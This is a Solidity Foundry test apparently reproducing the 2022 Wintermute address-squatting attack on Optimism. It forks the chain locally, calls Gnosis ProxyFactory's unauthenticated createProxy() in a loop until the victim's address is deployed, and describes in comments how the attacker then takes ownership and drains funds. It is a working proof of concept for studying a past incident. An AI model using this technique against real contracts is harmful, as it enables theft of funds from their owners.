// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// POC for 2022-06 Optimism / Wintermute address-squatting via Gnosis ProxyFactory
// Root cause: ProxyFactory.createProxy() performs an unauthenticated CREATE deployment whose address is a pure function of the factory nonce.
// Attacker advances nonce until CREATE deploys at a chosen target address, then initializes the resulting proxy to self.

interface ProxyFactory {
    function createProxy(address masterCopy, bytes calldata data) external returns (address payable proxy);
}

contract ContractTest is Test {
    ProxyFactory proxy = ProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
    address public childcontract;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8550", 10_607_735); //fork optimism at block 10607735
    }

    function testExploit() public {
        // EXPLOIT STEP 1: Identify the target address (0x4f3a120E72C76c22ae802D129F599BFDbc31cb81) that the victim (Wintermute) intends to control.
        // This address was either pre-computed (via the same factory logic) or was the L1 Safe address being "reused" on Optimism L2.
        // At the forked block, this address is still empty, so deployable.
        // The attacker does not use createProxyWithNonce (CREATE2 path) because that would require knowing/choosing a salt that collides;
        // instead the attacker abuses the simple CREATE path whose address is globally sequential on the factory.

        // EXPLOIT STEP 2: Brute-force advance the factory's nonce by calling the permissionless createProxy() repeatedly.
        // Each call does `new Proxy(masterCopy)` inside ProxyFactory (see sources/ProxyFactory_76E2cF/ProxyFactory.sol:74),
        // which consumes exactly one nonce from the factory contract (0x76E2cF...).
        // The while loop keeps deploying "throwaway" proxies (with empty initializer data) until the address returned
        // exactly equals the target. The chosen masterCopy (0xE7145dd6...) is the one that will be delegated to.
        // Why it works: no access control on createProxy + CREATE addressing is deterministic from deployer nonce only.
        // Gas cost is linear in the distance to the target nonce; in the real incident it was feasible.
        while (childcontract != 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81) {
            childcontract = proxy.createProxy(0xE7145dd6287AE53326347f3A6694fCf2954bcD8A, "0x");
            emit log_named_address("Created Wintermute contract", childcontract);
        }

        // EXPLOIT STEP 3 (post-POC): With the Proxy now deployed at the victim's address, the attacker calls
        // the initializer/setup function on it (delegated to the masterCopy). Because deployment used empty data,
        // the proxy was not initialized by the creator. The attacker sets themselves as owner(s) of the Gnosis Safe
        // (or equivalent logic in the masterCopy).
        // Result: attacker now fully controls the contract at 0x4f3a12... and can drain any ETH/ERC20/tokens
        // that were sent to it (or that Wintermute later bridged expecting to be the owner).
        // The emitted log in the loop shows the final childcontract will be the hijacked address.
    }
}
